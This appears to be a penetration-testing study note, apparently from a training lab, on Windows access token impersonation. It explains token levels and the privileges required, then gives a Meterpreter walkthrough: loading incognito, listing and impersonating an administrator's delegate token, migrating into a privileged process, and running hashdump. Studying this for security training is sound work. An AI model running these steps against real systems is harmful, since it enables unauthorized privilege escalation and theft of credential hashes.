Windows access token created and managed by LSASS. A Windows access token is responsible for identifying and describing the security context of a process or
a thread running on a system. These can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without
having to provide creds each time a process is started or a system resource is accessed.

Access tokens are generated by winlogon.exe process everytime a user auths successfully (first windows logon) and includes the identity and privs of the user account
associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by the user will inherit a copy
of the access token from their creator and will run under the privs of the same access token.

Windows access tokens are catagorized based on the varying security levels assigned to them. These security levels are used to determine the privs assigned to
a specific token.

An access token will be typically assigned one of the following security levels:
-Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
-Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through RDP.

Impersonate level tokens can be used to impersonate a token on a local system and not on any external system that utilzes the token.

Delegate level tokens pose the largest threat as they can be used to impersonate tokens on any system.

The process of impersonating access tokens to elevate privs on a system will primarily depend on the privs assigned to the account that has been exploited to gain
initia access as well as the impersonation or delegation tokens available.

The following are the privs that are required for a successful impersonation attack:
-SeAssignPrimaryToken: This allows a user to impersonate tokens
-SeCreateToken: This allows a user to create an arbitrary token with administrative privs
-SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with admin privs



Incognite is a module that allows you to impersonate user tokens after successful exploitation, we can use incognito to display a list of available tokens that we can
impersonate.

**Go through the normal process of exploiting machine, once you have a meterpreter session**
sysinfo
getuid (NT AUTHORITY\SYSTEM means we have highest privs and LOCALSERVICE means we have privs associated with a local service account like a service.)
getprivs (check if you have the SeImpersonatePrivilege which is required to perform token impersonation)

**We can begin the process, type this while in your meterpreter session**
load incognito
list_tokens -u
**copy the name of the delegate token name such as "ATTACKDEFENSE\Administrator"**
impersonate_token "ATTACKDEFENSE\Administrator"
getuid (should now show you as the impersonated account)
ps (lists processes so you can migrate to a privileged service)
migrate 3544 (example process)
can now hashdump cd C:\\, cd Users, cd Administrator



